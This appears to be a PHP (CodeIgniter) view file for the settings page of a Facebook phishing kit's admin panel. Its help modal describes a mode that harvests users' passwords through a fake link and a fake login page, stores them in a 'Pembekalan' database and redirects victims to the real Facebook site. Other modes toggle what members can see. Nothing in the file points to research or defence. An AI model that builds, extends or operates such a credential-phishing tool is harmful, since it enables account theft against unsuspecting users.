<?= $this->extend('facebook/logged') ?>

<?= $this->section('content') ?>
<div class="d-flex justify-content-center">
    <div class="card" style="width: 30%;">
        <div class="card-body d-grid">
            <h6>SETTINGS</h6>
            <a href="<?= base_url('facebook/home'); ?>" type="button" class="btn btn-info text-white btn-lg mb-2"><i class="fa-solid fa-house"></i></a>
            <div class="d-flex justify-content-between gap-2">
                <a data-bs-toggle="modal" data-bs-target="#tools" style="width: 100%;" href="" type="button" class="btn btn-danger btn-lg mb-2"><i class="fa-solid fa-circle-question"></i> Ket</a>
                <a style="width: 100%;" href="<?= base_url('facebook/update_versi_fb'); ?>" type="button" class="btn btn-primary btn-lg mb-2">Versi <?= settings()['versi_fb']; ?></a>
            </div>
            <a href="<?= base_url('facebook/data_fyp'); ?>" type="button" class="btn btn-success btn-lg mb-2"><i class="fa-solid fa-server"></i> Fyp</a>
        </div>
    </div>
</div>

</div>

<!-- modal tools -->
<div class="modal fade" id="tools" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-body">
                <ol class="list-group list-group-numbered">
                    <?php if (settings()['versi_fb'] == 1) : ?>
                        <li class="list-group-item">Type input username in login page set to "email"</li>
                        <li class="list-group-item">Get password user by fake link and fake page.</li>
                        <li class="list-group-item">Password send to "Pembekalan" DB.</li>
                        <li class="list-group-item">Redirect to real page FB</li>

                    <?php elseif (settings()['versi_fb'] == 2) : ?>
                        <li class="list-group-item">Type input username in login page set to "text"</li>
                        <li class="list-group-item">Hide setting button on top menu in user/member home page.</li>
                        <li class="list-group-item">User/member can't look summary "FYP" page.</li>
                        <li class="list-group-item">Just user/Root have setting button on top menu</li>

                    <?php elseif (settings()['versi_fb'] == 3) : ?>
                        <li class="list-group-item">Type input username in login page set to "text"</li>
                        <li class="list-group-item">Show setting button on top menu in user/member home page.</li>
                        <li class="list-group-item">User/member can look summary "FYP" page.</li>
                    <?php endif; ?>
                </ol>


            </div>
        </div>
    </div>
</div>
<?= $this->endSection() ?>